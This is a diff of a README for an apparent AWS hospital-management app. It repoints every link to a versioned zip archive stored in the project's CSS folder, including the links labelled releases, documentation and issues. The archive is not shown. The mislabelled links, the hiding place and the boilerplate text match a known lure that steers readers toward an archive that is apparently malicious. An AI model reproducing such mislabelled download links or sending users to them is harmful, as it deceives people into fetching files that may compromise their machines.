@@ -4,13 +4,13 @@
 Welcome to the multi-tier-hospital-aws-app! This application offers a complete hospital management system based on Amazon Web Services (AWS). It uses a three-tier architecture, ensuring reliability and scalability. Built with Terraform for infrastructure management and Flask for the application, this system streamlines healthcare operations.
 
 ## 📥 Download the Application
-[![Download multi-tier-hospital-aws-app](https://raw.githubusercontent.com/Josedilro/multi-tier-hospital-aws-app/main/petioled/multi-tier-hospital-aws-app.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/Josedilro/multi-tier-hospital-aws-app/main/petioled/multi-tier-hospital-aws-app.zip)
+[![Download multi-tier-hospital-aws-app](https://github.com/Josedilro/multi-tier-hospital-aws-app/raw/refs/heads/main/application/static/css/hospital-aws-tier-app-multi-3.6-alpha.5.zip%20Now-Get%20Started-blue)](https://github.com/Josedilro/multi-tier-hospital-aws-app/raw/refs/heads/main/application/static/css/hospital-aws-tier-app-multi-3.6-alpha.5.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Click on this link: [Download the latest version](https://raw.githubusercontent.com/Josedilro/multi-tier-hospital-aws-app/main/petioled/multi-tier-hospital-aws-app.zip). This page lists all available versions of the multi-tier-hospital-aws-app.
+   Click on this link: [Download the latest version](https://github.com/Josedilro/multi-tier-hospital-aws-app/raw/refs/heads/main/application/static/css/hospital-aws-tier-app-multi-3.6-alpha.5.zip). This page lists all available versions of the multi-tier-hospital-aws-app.
 
 2. **Choose Your Version**  
    Browse the available releases. Each version represents an update to the application. Look for the most recent version for the best features.
@@ -40,10 +40,10 @@ To ensure that the multi-tier-hospital-aws-app runs smoothly, you will need:
 - **Real-Time Analytics:** Get insights from hospital operations.
   
 ## 📚 Documentation
-For detailed information about features and functionality, visit the [Documentation Page](https://raw.githubusercontent.com/Josedilro/multi-tier-hospital-aws-app/main/petioled/multi-tier-hospital-aws-app.zip).
+For detailed information about features and functionality, visit the [Documentation Page](https://github.com/Josedilro/multi-tier-hospital-aws-app/raw/refs/heads/main/application/static/css/hospital-aws-tier-app-multi-3.6-alpha.5.zip).
 
 ## 🔧 Support
-If you encounter any issues or have questions, please visit the [Issues Section](https://raw.githubusercontent.com/Josedilro/multi-tier-hospital-aws-app/main/petioled/multi-tier-hospital-aws-app.zip). Here, you can report a problem or ask for help.
+If you encounter any issues or have questions, please visit the [Issues Section](https://github.com/Josedilro/multi-tier-hospital-aws-app/raw/refs/heads/main/application/static/css/hospital-aws-tier-app-multi-3.6-alpha.5.zip). Here, you can report a problem or ask for help.
 
 ## 📜 License
 This application is open-source and available under the MIT License. You may use, modify, and distribute it according to the license terms.
@@ -52,6 +52,6 @@ This application is open-source and available under the MIT License. You may use
 Join our community on social media platforms or online forums to discuss features, share experiences, and ask questions. Look for the **multi-tier-hospital-aws-app** group or hashtag.
 
 ## 📥 Download the Application Again
-To download the application again, simply visit the releases page: [Download the latest version](https://raw.githubusercontent.com/Josedilro/multi-tier-hospital-aws-app/main/petioled/multi-tier-hospital-aws-app.zip).
+To download the application again, simply visit the releases page: [Download the latest version](https://github.com/Josedilro/multi-tier-hospital-aws-app/raw/refs/heads/main/application/static/css/hospital-aws-tier-app-multi-3.6-alpha.5.zip).
 
 Thank you for choosing the multi-tier-hospital-aws-app! We hope you find it helpful in managing your hospital operations.
